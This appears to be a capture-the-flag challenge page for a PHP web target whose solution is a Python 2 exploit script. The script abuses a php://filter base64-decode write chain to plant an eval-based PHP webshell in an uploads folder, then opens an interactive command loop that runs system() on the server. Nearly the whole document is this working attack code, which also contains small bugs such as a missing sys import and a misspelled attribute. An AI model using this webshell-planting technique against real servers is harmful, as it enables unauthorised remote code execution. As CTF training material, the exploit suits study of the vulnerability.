#### Goals
 * RCE and try to find the flag

#### Server Address
 * http://web.sniperoj.com:10008/

#### Solution
```python
#!/usr/bin/env python

import requests
import string


if len(sys.argv) != 3:
	print "Usage: "
	print "\tpython %s [HOST] [PORT]" % (sys.argv[0])
	exit(1)

host = sys.argv[1]
port = int(sys.argv[2])

url = "http://%s:%d/" % (host, port)

password = "c"
webshell = "<?php eval($_POST[%s]);?>" % (password)
filename = "sh311.php"
writeable = "uploads/"

def exploit():
	data = {
		"filename":"php://filter/write=string.strip_tags/write=convert.base64-decode/resource=%s%s" % (writeable, filename),
		"code":webshell.encode("base64"),
	}
	response = requests.post(url, data=data)
	if response.status_code == 200:
		return True
	return response.satus_code

def shell(webshell_url):
	while True:
		command = raw_input("=>")
		if string.lower(command) == "exit":
			break
		# system, exec, shell_exec, popen, proc_open, passthru
		data = {password:"system('%s');" % (command)}
		response = requests.post(webshell_url, data=data)
		print response.text
		pass

def main():
	print "[+] Lauching attack"
	result = exploit()
	if result == True:
		print "[+] Exploited!"
		print "[+] The webshell is : %s" % (webshell)
		webshell_url = url + writeable + filename
		print "[+] Stored at : %s" % (webshell_url)
	else:
		print "[-] Exploit failed! Error code : [%d]" % (result)
	shell(webshell_url)

if __name__ == '__main__':
	main()
```

#### Writeups
 * [Offical Writeup]()


